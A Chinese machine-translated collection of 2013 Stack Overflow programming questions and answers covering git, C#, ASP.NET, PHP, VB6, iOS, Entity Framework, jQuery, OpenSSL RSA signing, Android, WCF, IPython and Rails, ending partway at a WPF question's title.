我有一个特定的目录，其中源代码在特定的提交中被修改`0x0x0x0x0`。在那次提交之后，许多其他的提交都在主节点上。

我想取消该提交`0x0x0x0x0`，并且此特定目录中的本地（而不是上游）在进行此提交之前具有代码。我可以为此运行哪些 git 命令？

***稍后编辑***：我只想取消那个特定的提交，而不是随后的更改。作为代码它不会影响我，因为它是一个独立的模块。此外，我不会使用这个本地存储库来进一步提交上游。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-26T15:03:05.597

如果您想回到引入提交之前，从而有效地删除其更改以及之后发生的所有更改（在其他提交中），您可以执行以下操作：

*   签出旧版本的新分支，这样您就不会丢失任何信息，而是可以从旧状态重新启动：`git checkout -b <newbranchname> commithash~1`
*   将当前分支重置为旧版本，如果没有其他分支指向它们，则有效地从历史记录中删除所有提交：`git reset --hard commithash~1`

但是，如果您只想撤消所述提交，同时保留之后所做的所有更改，您可以这样做：

```
git revert commithash 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-26T15:14:51.770

可以使用以下命令返回到任何提交：

`git reset --hard commit_identifier`

注意：获取提交标识符使用`git log`命令

您还可以使用以下命令重置上次提交：

`git commit --amend`

请查看下一个链接以获取更多信息：

[http://www.kernel.org/pub/software/scm/git/docs/git-reset.html](http://www.kernel.org/pub/software/scm/git/docs/git-reset.html)

# c# - 删除 BCD 字符串中等于 0 的最低有效位

> ID：15092268
> 
> 赞同：1
> 
> 时间：2013-02-26T14:58:51.400
> 
> 标签：c#, bit-manipulation

我正在读取一个文件，其中包含一组表示为 BCD（二进制编码十进制）的值。这些值可以用不同的字节长度表示。

例如，V 的值：
V= 00 08 88 88
V= 10 00 00 00 08 34 00 00
V= 11 32 22 01 11 00 00 00 00 00 00 00
***注意****：不考虑空格，我将它们设置为阅读目的，00 08 88 88 的实际值为 00088888。*

我的问题是我需要从 V 中删除零。
上述解决方案应该是：
V= 00 08 88 88
V= 10 00 00 00 08 34
V= 11 32 22 01 11

解决我的问题的一种简单方法是迭代并从最低有效位中删除，直到达到非零位。你有什么建议？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T15:03:32.553

右移你的字节直到`MyValue AND 0x01 > 0`

```
public byte[] ShiftRight(byte[] value, int bitcount)
{
    byte[] temp = new byte[value.Length];
    if (bitcount >= 8)
    {
        Array.Copy(value, 0, temp, bitcount / 8, temp.Length - (bitcount / 8));
    }
    else
    {
        Array.Copy(value, temp, temp.Length);
    }
    if (bitcount % 8 != 0)
    {
        for (int i = temp.Length - 1; i >= 0; i--)
        {
            temp[i] >>= bitcount % 8;
            if (i > 0)
            {
                temp[i] |= (byte)(temp[i - 1] << 8 - bitcount % 8);
            }
        }
    }
    return temp;
} 
```

代码取自这里的另一篇[文章](https://stackoverflow.com/questions/1275572/bit-shifting-n-bits)。

# javascript - 在 DOM 模型/JavaScript 中，一个文本框和输入的值有区别吗？

> ID：15092278
> 
> 赞同：0
> 
> 时间：2013-02-26T14:59:13.397
> 
> 标签：javascript, jquery, dom, firebug

我知道这可能真的是婴儿问题……但这让我很困惑。如果我在 Firebug 中查看一个页面（这是一个 SSRS 生成的网页，即 ReportViewer），如下所示：

![在此处输入图像描述](../Images/0db027f4d87e3a90a552d0bb4b06d6a4.png)

所以我想在那里获得实际输入框的 ID，并且出现的标签说`_value` - 这是否意味着我没有获得输入框 ID？我将如何获得它（只是输入文本框）？

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-26T15:01:51.187

该输入的 ID 是`MainContent_rptCompletes_ctl00_ctl03_txtValue`（感谢 ASP.NET 网络表单）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-26T15:07:20.487

您可以检索`TextBox` `ID`using `TextBox.ClientID`。如果要确保`TextBox`与 相同`ClientID`，`ID`则将 设置`ClientIDMode`为`Static`。

```
<asp:TextBox ID="BoxID" runat="server" ClientIDMode="Static">
</asp:TextBox> 
```

# php - 从 mysql 存储和检索用户 js 文件。php

> ID：15092279
> 
> 赞同：1
> 
> 时间：2013-02-26T14:59:13.840
> 
> 标签：php, javascript, mysql

有没有办法将 js 文件存储在 mysql 中，然后使用 php 脚本检索它并包含到网站页面？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-26T15:08:50.997

你的html：

```
<script type="text/javascript" src="/jsserver.php?id=1"/> 
```

jsserver.php 脚本：

```
<?php
  // connect to your db the way you like

  $id=intval($_REQUEST['id']);
  $query='SELECT jsscript FROM jstable WHERE id='.$id;

  // execute query 

  // fetch javascript code from table "jstable" field "jsscript"

  // $jsscript contains the javascript code

  header('Content-type: text/javascript');  
  echo $jsscript;

?> 
```

这应该足以让您完成工作。

# xml - 如何在 VB6.0 中删除此选项卡空间

> ID：15092280
> 
> 赞同：0
> 
> 时间：2013-02-26T14:59:14.527
> 
> 标签：xml, vb6

我有一个这样的 XML 文件：

```
<root>
     <Sample>
           <Detail></Detail>
           <Test></Test>
     </Sample>
     </root> 
```

如何删除标签中的制表符空间`</root>`？

我使用的是 VB6.0，我曾经`createTextNode(vbNextLine + vbTab)`创建过这种格式，我遇到的唯一问题是标签中的标签空间的最后一部分`</root>`。

顺便说一句，我正在使用循环来获取 Sample 标签下的项目。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-26T15:15:45.277

假设您想保留元素的缩进`<Sample>`，请调整代码以在元素之前添加换行符和制表符，并在`<Sample>`元素之前添加换行符`</root>`。

我也忽略了额外的空白与 XML 无关的事实。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T23:20:52.190

如果 CreateTextNode() 返回一个字符串，或者 xml 内容临时存储在字符串变量或 texbox 中，则可以使用 Replace 函数：

```
replace(MyNode, vbtab & "</root>","</root>" ) 
```

或者

```
replace(MyXml, vbtab & "</root>","</root>" ) 
```

或者

```
replace(MyTexbox.text, vbtab & "</root>","</root>" ) 
```

# ios - 经纬度定位困难

> ID：15092281
> 
> 赞同：0
> 
> 时间：2013-02-26T14:59:21.083
> 
> 标签：ios, localization, nsstring

在我的应用程序中有一些代码可以检索位置。标准显示方法是浮动。（54.23456）我能够将其“转换”为具有度数、分钟数和秒数的格式。还添加了字符 (N)orth、(S)outh (E)ast 和 (W)est。查看我的代码：

```
double actLat = [[latitude text]doubleValue];
int latSeconds = actLat * 3600;
int latDegrees = latSeconds / 3600;
latSeconds = abs(latSeconds % 3600);
int latMinutes = latSeconds / 60;
latSeconds %= 60;

char latChar = (latitude > 0) ? 'N' : 'S';

double actLon = [[longitude text]doubleValue];
int lonSeconds = actLon * 3600;
int lonDegrees = lonSeconds / 3600;
lonSeconds = abs(lonSeconds % 3600);
int lonMinutes = lonSeconds / 60;
lonSeconds %= 60;

char lonChar = (longitude > 0) ? 'E' : 'W';

NSString *actPosition = [[NSString alloc]initWithFormat:@"Actual: %i° %i' %i\" %c" "   " @"%i° %i' %i\" %c \n", latDegrees, latMinutes, latSeconds, latChar,lonDegrees, lonMinutes, lonSeconds, lonChar];

NSString* tempActPos = NSLocalizedString(actPosition, @"");

_actualPosition.text = tempActPos; 
```

现在我正在尝试本地化 NSString *actPosition。实际 -> Huidig（荷兰语）然后是位置和字符 (N)oord、Z(uid)、(O)ost、(W)est。

我完全被困在这里。现在阅读了几天关于本地化的内容，但现在我显然无法理解它。请指教。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T11:59:02.367

我改变了我的代码。我为单词 Actual (NSLocalizedString (@"WordWatched",@"") 添加了单独的可本地化字符串，并将这个新创建的字符串添加到 NSString 对象中以显示在我的视图中。

这是一段示例代码：

```
NSString *lonStringLocal = NSLocalizedString((valueLon > 0) ? @"East" : @"West", @"");

tempPos = [[CLLocation alloc] initWithLatitude:valueLat longitude:valueLon];

NSString *watchedPosWord = NSLocalizedString (@"WordWatched", @"");
NSString *recPosition = [[NSString alloc]initWithFormat:@"%@ %i° %i' %i\" %@" "   " @"%i° %i' %i\" %@ \n", watchedPosWord, latDegrees, latMinutes, latSeconds, latStringLocal,lonDegrees, lonMinutes, lonSeconds, lonStringLocal]; 
```

# c# - 实体框架 - 使用具有不同连接字符串的相同 DbContext

> ID：15092290
> 
> 赞同：5
> 
> 时间：2013-02-26T14:59:53.667
> 
> 标签：c#, .net, entity-framework

我目前正在尝试在我的应用程序中使用相同的 DbContext（我有两个结构相同的数据库）。我不太确定我做错了什么，但这是我当前的代码 - 希望它应该很明显我正在尝试做什么。我使用的是EF Database First（底部的错误似乎没有暗示）。

我的上下文工厂代码：

```
public class HOLContextFactory
    {
        public static HOLDbEntities Create()
        {
            return new HOLDbEntities(); // Works
        }

        public static HOLDbQuoteEntities CreateQuote()
        {
            return new HOLDbQuoteEntities(); // Gives error
        }
    }

public partial class HOLDbQuoteEntities : HOLDbEntities
    {
        public HOLDbQuoteEntities()
            : base("HOLDbQuoteEntities") // This should send "HOLDbQuoteEntities" as the base connection string?! 
// Also tried "name=HOLDbQuoteEntities"
            {
            }
        } 
```

Web.config 连接字符串：

```
<add name="HOLDbEntities" connectionString="metadata=res://*/HOLDbContext.csdl|res://*/HOLDbContext.ssdl|res://*/HOLDbContext.msl;provider=System.Data.SqlClient;provider connection string=<connstringdetails>" providerName="System.Data.EntityClient" />

<add name="HOLDbQuoteEntities" connectionString="metadata=res://*/HOLDbContext.csdl|res://*/HOLDbContext.ssdl|res://*/HOLDbContext.msl;provider=System.Data.SqlClient;provider connection string=<connstringdetails>" providerName="System.Data.EntityClient" /> // using diff database - same structure 
```

使用“HOLDbQuoteEntities”时出现错误：

> 如果在 Code First 模式下使用，使用用于 Database First 和 Model First 开发的 T4 模板生成的代码可能无法正常工作。要继续使用 Database First 或 Model First，请确保在执行应用程序的配置文件中指定了实体框架连接字符串。要使用从 Database First 或 Model First 生成的这些类，使用 Code First 添加使用属性或 DbModelBuilder API 的任何其他配置，然后删除引发此异常的代码**

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-31T08:40:52.273

Entity Framework 需要使用实际的实体对象：

```
public class HOLContextFactory
{
    public static HOLDbEntities Create()
    {
        // default connection string
        return new HOLDbEntities(); 
    }

    public static HOLDbEntities CreateQuote()
    {
        // specified connection string
        return new HOLDbEntities ("HOLDbQuoteEntities"); 
    }
}

public partial class HOLDbEntities
{
    public HOLDbEntities(string connectionString)
        : base(connectionString) 
        {
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-26T15:39:25.990

我在我的一个项目中做了同样的事情。我正在使用创建我的实体上下文`metadata=res://*/`

试试这个：

```
<add name="HOLDbEntities" connectionString="metadata=res://*/;provider=System.Data.SqlClient;provider connection string=<connstringdetails>" providerName="System.Data.EntityClient" />

<add name="HOLDbQuoteEntities" connectionString="metadata=res://*/;provider=System.Data.SqlClient;provider connection string=<connstringdetails>" providerName="System.Data.EntityClient" /> 
```

# jquery - Firefox 只运行一次 CSS 动画

> ID：15092297
> 
> 赞同：1
> 
> 时间：2013-02-26T15:00:12.447
> 
> 标签：jquery, firefox, css, css-animations

我正在为初学者构建一个开源标签系统。我想我发现了 Firefox 如何呈现 CSS 动画的错误。

## 标签动画在 Firefox 中只触发一次

我正在使用 Dan Edens animate.css 为每个选项卡制作动画。在 Chrome 和 Safari 中一切正常，但是 firefox 只运行一次动画，然后再也不会触发它。

看看 jsfiddle 上的以下演示，看看我在说什么：http: [//jsfiddle.net/jsheffers/vqdJK/](http://jsfiddle.net/jsheffers/vqdJK/)

```
$('#tabs li a').click(function(e){

    $('#tabs li, #content .current').removeClass('current');
    $(this).parent().addClass('current');
    var currentTab = $(this).attr('href');
    $(currentTab).addClass('current fadeInLeft');
    e.preventDefault();

}); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-26T15:08:35.980

您忘记删除`fadeInLeft`课程（[小提琴](http://jsfiddle.net/UgUn8/)）。

```
$('#tabs li, #content .current').removeClass('current').remove('fadeInLeft'); 
```

它在 Firefox 中运行良好！

# cryptography - 使用 256 位 RSA 密钥签署 20 字节消息，可与 openssl.exe 一起使用，但不在代码中

> ID：15092298
> 
> 赞同：3
> 
> 时间：2013-02-26T15:00:13.533
> 
> 标签：cryptography, openssl, rsa

我有一个 256 位私钥，我想用它来签署 SHA-1 摘要（20 字节）。直接使用openssl似乎可以工作

> 回声无关紧要 | openssl dgst -sha1 -binary | openssl rsautl -sign -inkey 256bit_private_key.pem | openssl enc -base64

给了我预期的 Base64 输出。

但是使用 OpenSSL 失败并显示“错误：04075070:rsaroutines:RSA_sign:digest too big for rsa key”。正如您在下面看到的，我将 20 字节 (SHA_DIGEST_LENGTH=20) SHA-1 摘要作为输入传递给 RSA_sign。即使有填充，它也不应该超过我可以用 256 位模数密钥加密的最大 32 字节？！

```
unsigned char digest[SHA_DIGEST_LENGTH];
SHA1(message, messageSize, digest);

unsigned int privateKeySize = RSA_size(privateKey); // 256 bits = 32 bytes
unsigned char* signature = new unsigned char[privateKeySize];
unsigned int signatureSize;

int res = RSA_sign(NID_sha1, digest, SHA_DIGEST_LENGTH, signature, &signatureSize, privateKey);

if(res == 0)
{
    int err = ERR_get_error(); // 67588208
    char *s = ERR_error_string(err, 0); // error:04075070:lib(4):func(117):reason(112)

    delete [] signature;

    [...]
} 
```

我在代码中做错了什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-26T18:58:01.557

看看这个[答案](https://stackoverflow.com/a/10443732/1904979)。`rsautl`折旧有利于`pkeyutl`

本质上，RSA 签名应该使用 RSA-PSS 签名填充方案以确保安全，并且 RSA-PSS 将严格大于摘要，因为需要通信盐。此外，`RSA_sign`将摘要作为签名方案的一部分，因此您的代码将对摘要进行摘要。您想改为直接传递消息，或者`RSA_private_encrypt`与合适的`RSA_padding_add_x`调用结合使用。

正如我在评论中所说，256 位密钥对于对称算法来说足够安全，但破解 RSA 私钥将是微不足道的（在[几年前的机器上大约需要 4 分钟](https://math.stackexchange.com/a/28678)）。使用最少的 1024 位密钥（可能是 2048 或 4096 位密钥）将为您提供大致相当于 128 位对称算法的[安全级别。](http://www.cryptopp.com/wiki/Security_Level)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-10-10T20:55:18.357

Re Peter Elliott：不完全是。

[RFC8017 第 8.2.1 节](https://www.rfc-editor.org/rfc/rfc8017#section-8.2.1)（和 9.2，在 rfc4347 和 rfc3447 中类似）中的 PKCS1v1_5 标准序列是散列，在 ASN.1 中编码，填充（'type 1'）和 modexp d。（PSS 省略了 ASN.1 步骤并使用不同的填充。）

OpenSSL（低级）`RSA_sign`执行最后三个（使用 v1.5 填充）但不是第一个 - 即它*编码*散列但它不*执行*散列；甚至更低`RSA_private_encrypt`的是最后两个。更高级别的信封模块（原始`EVP_Sign{Init,Update,Final}*`，增强`EVP_DigestSign*`）完成所有四个。正是 ASN.1 编码使该值对于 256 位密钥来说太大了——正如所说的那样，无论如何都是可以破解的。

`rsautl`只执行最后两个步骤而不是编码，因此它运行但给出非标准结果。 `pkeyutl`对于 RSA，默认情况下也是如此，但可以被告知进行编码。

此外，PSS 具有更好的安全证明，但据我所知，v1.5 没有受到实际攻击，它仍然被广泛使用。如果你有PSS的选择（双方/各方都支持）选择它，但不用担心使用v1.5。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-26T15:18:02.013

猜猜我找到了解决方案。`openssl rsautl -sign`使用`RSA_private_encrypt`而不是`RSA_sign`（我所期望的）。`RSA_sign`创建比我提供的 20 字节消息更长的结构，因此它会因给定错误而失败。

# android - 如果您的图像存储在数组中，您如何设置墙纸？

> ID：15092299
> 
> 赞同：0
> 
> 时间：2013-02-26T15:00:14.733
> 
> 标签：android, wallpaper, android-drawable

我在一个名为 pics 的数组中有许多图像。我在哪里调用壁纸管理器？请告诉我单击图像视图时如何创建墙纸。我知道我必须在 imageview 上创建一个 OnCickLisener，然后使用壁纸管理器来调用图像。但是由于图像位于数组中，我如何调用正在单击的特定图像？因为它不会在 R.drawable . 这是我的代码：

```
public class Rd extends Activity  {
    Integer [] pics= {
        R.drawable.rd1,
        R.drawable.rd2,
        R.drawable.rd3,
        R.drawable.rd4,
        R.drawable.rd5,

    };
    ImageView imageView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_dravid);
        Gallery ga = (Gallery)findViewById(R.id.Gallery01);
    ga.setAdapter(new ImageAdapter(this));

    imageView = (ImageView)findViewById(R.id.ImageView01);
    ga.setOnItemClickListener(new OnItemClickListener() {

            @Override
            public void onItemClick(AdapterView<?> arg0, View arg1, int arg2,
                    long arg3) {
                Toast.makeText(getBaseContext(), 
            "You have selected picture " + (arg2+1) +"of Rd", 
                        Toast.LENGTH_SHORT).show();
                imageView.setImageResource(pics[arg2]);

            }

        });

    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.activity_dd, menu);
        return true;
    }
     public class ImageAdapter extends BaseAdapter {

    private Context ctx;
    int imageBackground;

    public ImageAdapter(Context c) {
            ctx = c;
            TypedArray ta = obtainStyledAttributes(R.styleable.Gallery1);
            imageBackground = ta.getResourceId(R.styleable.Gallery1_android_galleryItemBackground, 1);
            ta.recycle();
        }

        @Override
    public int getCount() {

        return pics.length;
    }

    @Override
    public Object getItem(int arg0) {

        return arg0;
    }

    @Override
    public long getItemId(int arg0) {

        return arg0;
    }

    @Override
    public View getView(int arg0, View arg1, ViewGroup arg2) {
        ImageView iv = new ImageView(ctx);
        iv.setImageResource(pics[arg0]);
        iv.setScaleType(ImageView.ScaleType.FIT_XY);
        iv.setLayoutParams(new Gallery.LayoutParams(200,120));
        iv.setBackgroundResource(imageBackground);
        return iv;
    }

   }
} 
```

这是强制关闭的堆栈跟踪：

```
2-26 21:22:02.817: I/Process(440): Sending signal. PID: 440 SIG: 9
02-26 21:23:04.677: D/dalvikvm(472): GC_EXTERNAL_ALLOC freed 53K, 52% free 2586K/5379K, external 1012K/1038K, paused 70ms
02-26 21:23:09.967: D/AndroidRuntime(472): Shutting down VM
02-26 21:23:09.967: W/dalvikvm(472): threadid=1: thread exiting with uncaught exception (group=0x40015560)
02-26 21:23:09.990: E/AndroidRuntime(472): FATAL EXCEPTION: main
02-26 21:23:09.990: E/AndroidRuntime(472): java.lang.SecurityException: Access denied to process: 472, must have permission android.permission.SET_WALLPAPER
02-26 21:23:09.990: E/AndroidRuntime(472):  at android.os.Parcel.readException(Parcel.java:1322)
02-26 21:23:09.990: E/AndroidRuntime(472):  at android.os.Parcel.readException(Parcel.java:1276)
02-26 21:23:09.990: E/AndroidRuntime(472):  at android.app.IWallpaperManager$Stub$Proxy.setWallpaper(IWallpaperManager.java:179)
02-26 21:23:09.990: E/AndroidRuntime(472):  at android.app.WallpaperManager.setResource(WallpaperManager.java:448)
02-26 21:23:09.990: E/AndroidRuntime(472):  at com.wallpaper.rahul.dravid.RahulDravid$1$1.onClick(RahulDravid.java:141)
02-26 21:23:09.990: E/AndroidRuntime(472):  at android.view.View.performClick(View.java:2485)
02-26 21:23:09.990: E/AndroidRuntime(472):  at android.view.View$PerformClick.run(View.java:9080)
02-26 21:23:09.990: E/AndroidRuntime(472):  at android.os.Handler.handleCallback(Handler.java:587)
02-26 21:23:09.990: E/AndroidRuntime(472):  at android.os.Handler.dispatchMessage(Handler.java:92)
02-26 21:23:09.990: E/AndroidRuntime(472):  at android.os.Looper.loop(Looper.java:123)
02-26 21:23:09.990: E/AndroidRuntime(472):  at android.app.ActivityThread.main(ActivityThread.java:3683)
02-26 21:23:09.990: E/AndroidRuntime(472):  at java.lang.reflect.Method.invokeNative(Native Method)
02-26 21:23:09.990: E/AndroidRuntime(472):  at java.lang.reflect.Method.invoke(Method.java:507)
02-26 21:23:09.990: E/AndroidRuntime(472):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:839)
02-26 21:23:09.990: E/AndroidRuntime(472):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:597)
02-26 21:23:09.990: E/AndroidRuntime(472):  at dalvik.system.NativeStart.main(Native Method)
02-26 21:28:10.137: I/Process(472): Sending signal. PID: 472 SIG: 9 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:07:34.820

您应该能够从数组中引用，就像您在设置图像视图时所做的那样。

```
ga.setOnItemClickListener(new OnItemClickListener() {
    @Override
    public void onItemClick(AdapterView<?> parent, View v, int pos,long id) {
        Toast.makeText(v.getContext(), "You have selected picture " + (pos+1) +"of Rd", 
            Toast.LENGTH_SHORT).show();
        imageView.setImageResource(pics[pos]);
        imageView.setOnClickListner(new OnClickListener() {
          public void onClick(View v) {
            WallpaperManager wm = WallpaperManager.getInstance(v.getContext());
            try {
                wm.setResource(pics[pos]);
            } catch (IOException e) {
                e.printStackTrace();
            }
          }
        });
    }
}); 
```

我建议您养成将自动生成的变量名称重命名为更具描述性的习惯。您的代码非常令人困惑`arg0`，`arg1`等等......

此外，在创建 Toast 时，无需使用`getBaseContext()`您应该使用`YourActivity.this`或`v.getContext()`

# android - 间歇性连接被拒绝错误

> ID：15092300
> 
> 赞同：1
> 
> 时间：2013-02-26T15:00:19.360
> 
> 标签：android, wcf, iis-7.5

我对开发 WCF 服务有点陌生，并且在从 Android 应用程序调用 WCF Web 服务时遇到了两个问题。

1.  间歇性连接被拒绝错误 (HttpHostConnectException) - 如果我在几分钟不活动后尝试连接到 Web 服务，就会发生这种情况。

2.  对等连接重置 - 当一种特定的 Web 服务方法必须处理大量记录时，会发生这种情况。同样的方法适用于较小的结果集。我怀疑这可能与 ASP.NET 进程工作者有关，我一直在 IIS 中尝试不同的超时间隔，但问题仍然存在。

非常感谢您对上述内容的任何帮助。

设置：

*   IIS7.5 在具有单个进程工作者的 Windows Server 8 机器上运行
*   启用的 IIS 身份验证模式：匿名、Windows
*   Android v 2.3.3 引用 JCIFS 库进行 NTLM 身份验证
*   使用 HTTP POST 调用 RESTful WCF Web 服务
*   WCF 会话状态*模式="Off"，CookieLess = "UseDeviceProfile"，regenerateExpiredSessionId="true"*

谢谢，

京东

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T18:52:16.087

我猜您需要担心客户端超时，因为这些不是 WCF 错误（或者至少不是我以前见过的错误）。我对 Android 不太擅长，而且像往常一样没有太多需要帮助的人，但我会从连接和接收超时开始，看看这是否能改善情况。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T21:12:05.780

如果有人有兴趣知道解决方案：通过进行以下两项更改，我能够消除间歇性连接被拒绝错误：

*   禁用匿名身份验证并设置 HTTPClient 以使用 NTLM 身份验证进行连接
*   我没有为每个新的 HTTPPost 请求实例化一个新的 HTTPClient，而是在应用程序的生命周期内为所有请求重用一个实例，并在应用程序本身关闭时关闭连接。

# ipython-notebook - 在 Notebook 中包含外部 Python 源作为只读文本

> ID：15092308
> 
> 赞同：2
> 
> 时间：2013-02-26T15:00:38.797
> 
> 标签：ipython-notebook

我需要将某些 Python 文件保留在笔记本之外，因为它们需要从外部 shell 脚本中调用。但我也想显示/包含这些外部文件的代码；我看到有一个 %loadpy 魔术，其中包含带有语法突出显示的代码。然而，这种用法似乎包括代码作为真正的笔记本代码，因此代码是可编辑的。我希望代码显示为只读，不可编辑，所以我知道外部文件中的代码始终是主文件。对于只读代码包含，我使用

```
print open("source.py").read() 
```

在我的笔记本上。上面的代码是从一个显示下面代码的单元格中运行的。我想知道是否有更好的方法来做到这一点？也许使用 IPython.ext？因为上面代码的输出没有语法高亮。

# ruby-on-rails - 更新 gem 后出现 Rails 错误

> ID：15092312
> 
> 赞同：2
> 
> 时间：2013-02-26T15:00:45.317
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, rubygems, gem

运行后`gem update`，当我尝试启动 rails 时出现以下错误：

```
$ rails s
/usr/lib/ruby/1.9.1/rubygems.rb:238:in `activate': can't activate rack (~> 1.4.5, runtime)
for ["actionpack-3.2.12", "railties-3.2.12"], already activated rack-1.5.2 for ["rack-
ssl-1.3.3", "railties-3.2.12"] (Gem::LoadError)
    from /usr/lib/ruby/1.9.1/rubygems.rb:254:in `block in activate'
    from /usr/lib/ruby/1.9.1/rubygems.rb:253:in `each'
    from /usr/lib/ruby/1.9.1/rubygems.rb:253:in `activate'
    from /usr/lib/ruby/1.9.1/rubygems.rb:254:in `block in activate'
    from /usr/lib/ruby/1.9.1/rubygems.rb:253:in `each'
    from /usr/lib/ruby/1.9.1/rubygems.rb:253:in `activate'
    from /usr/lib/ruby/1.9.1/rubygems.rb:1065:in `gem'
    from /usr/local/bin/rails:18:in `<main>' 
```

谁能帮助我，这意味着什么以及如何解决问题？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-26T15:18:40.813

您必须使用捆绑程序运行它。

```
$ bundle exec rails s 
```

否则，您需要卸载机架版本 1.5.2。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-26T15:20:09.130

删除 Gemfile.lock

然后运行

```
$> bundle install 
```

# jquery - HTML5 文件拖放在第一次拖放后不再起作用

> ID：15092313
> 
> 赞同：1
> 
> 时间：2013-02-26T15:00:46.237
> 
> 标签：jquery, html, drag-and-drop

我正在使用 HTML5 拖放让用户将文件拖到我的页面（从他们的操作系统）。这实际上效果很好，文件被上传，每个人都很高兴。

但是，无论上传是完成还是取消，似乎都不再使用拖动功能了。

这是一些代码（或转到[jsFiddle](http://jsfiddle.net/ControlFreak/gqqVk/ "jsFiddle")）：

HTML：

```
<div id="MainDiv">
    <div id="DropZone" style="display: none;">Drop Files Here</div>
</div> 
```

CSS：

```
#MainDiv {
    height: 400px;
    width: 100%;
    border: 1px solid black;
}

#DropZone {
    position: absolute;
    height: 50%;
    width: 50%;
    border: thick dashed blue;
    border-radius: 12px;
    top: 10%;
    left: 25%;
    text-align: center;
    font-size: x-large;
    padding-top: 20px;
    color: blue;
} 
```

JavaScript：

```
$().ready(function () {
    $('#DropZone').on("dragenter dragend dragleave dragover drop", function (e) {
        e.preventDefault();
    });

    $.fn.dndhover = function (options) {
        return this.each(function () {
            var self = $(this);
            var collection = $();

            self.on('dragenter', function (event) {
                if (collection.size() === 0) {
                    self.trigger('dndHoverStart');
                }
                collection = collection.add(event.target);
            });

            self.on('dragleave', function (event) {
                setTimeout(function () {
                    collection = collection.not(event.target);
                    if (collection.size() === 0) {
                        self.trigger('dndHoverEnd');
                    }
                }, 1);
            });
        });
    };

    $('#MainDiv').dndhover().on({
        'dndHoverStart': function (event) {
            $('#DropZone').show();
            event.preventDefault();
            return false;
        },
            'dndHoverEnd': function (event) {
            $('#DropZone').hide();
            event.preventDefault();
            return false;
        }
    });

    $('#DropZone').bind('drop', function (e) {
        // Show div with dropped files .. user chooses upload or cancel
        $('#DropZone').hide(); // This would eventually happen regardless of success or failure
        return false;
    });
}); 
```

如果您将文件拖到 maindiv 上，则 dropzone 会按预期显示。如果您将任意数量的文件放在那里，一切都会按预期进行。但是，完成后，如果您将第二个文件（或一组文件）拖到 maindiv 上，则不会再发生任何事情。

任何线索我要去哪里错？

# ruby-on-rails - 配置文件选项正在重定向到帐户设置而不是保存

> ID：15092315
> 
> 赞同：0
> 
> 时间：2013-02-26T15:00:58.207
> 
> 标签：ruby-on-rails

我是 Rails 的新手。我正在设置用户个人资料并向其中添加字段，以便用户当然可以修改他们的个人资料信息，例如职业、关于我、身高、宗教等。这些信息与注册选项（帐户设置）完全不同。

我遇到的问题是个人资料页面将转发回帐户设置并说您必须输入密码，并且它显示所有帐户设置字段而不是个人资料字段。因此，我需要在用户提交信息后将个人资料页面保留在该页面上，并且我需要将该信息保存到他们的帐户中，以便他们稍后进行修改。

这是用于用户配置文件的 show.html 文件：

```
<h1><%= @user.username %></h1>

<h2>Basics</h2>

<%= form_for @user do |f| %>

    <div class="field">
        <%= f.label :height %><br/>
        <%= f.select :about_me, [['Feet', nil], '4', '5', '6'] %>
        <%= f.select :about_me, [['Inches', nil], '0', '1', '2', '3', '4',                  
                                '5', '6', '7', '8', '9', '10', '11'] %>
        </div>
    <div class="field">
        <%= f.label :career %><br/>
        <%= f.text_field :career %>
    </div>
    <div class="actions"><%= f.submit %></div>
<% end %> 
```

这是用户控制器，我知道我已将其重定向到 @user 并将其发送回帐户设置页面，但我不知道将其设置为什么值，因此它不会：

```
class UsersController < ApplicationController
  def new
    @user = User.new
  end

  def create
    @user = User.new(params[:user])
    if @user.save
      UserMailer.registration_confirmation(@user).deliver
      session[:user_id] = @user.id
      redirect_to root_url, notice: "Thank you for signing up!"
    else
      render "new"
    end
  end

  def show
    @user = User.find(params[:id])
    if @user.show_profile(params[:user])
      redirect_to @user
    else
      render 'edit'
    end
  end

    def edit
      @user = User.find(params[:id])
end

  def index
    @users = User.all
  end

  def destroy
     User.find(params[:id]).destroy
     flash[:success] = "User deleted."
     redirect_to users_url
   end

def update
    @user = User.find(params[:id])
    if @user.update_attributes(params[:user])
      flash[:success] = "Account updated"
      redirect_to @user
    else
      render 'edit'
    end
end
end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T15:30:05.817

Show 方法正在做它应该做的事情。它正在为您显示视图。正如您定义的那样，它应该被重定向到要为其显示个人资料的用户，这里也是如此。

无论情况如何，您的任务都是调用 create 方法：

所以你需要做的是：

**方法一是**`new.html.erb`为您在 中定义的内容定义您的代码`show.html.erb`。

这样做，不需要显式定义您的路径，`form_for`因为表单将在内部调用 create 方法。

**方法二**是在 form_for 中明确定义您的路径：

```
<%= form_for(@user, :url => {:action => :create}) do |f| %> 
```

请注意，方法一是做你需要的推荐方法，因为它是创建操作的工作来完成 post 方法的工作，然后执行数据库相关的任务。

# wpf - 如何防止 WPF 剪切我的图像？

> ID：15092323
> 
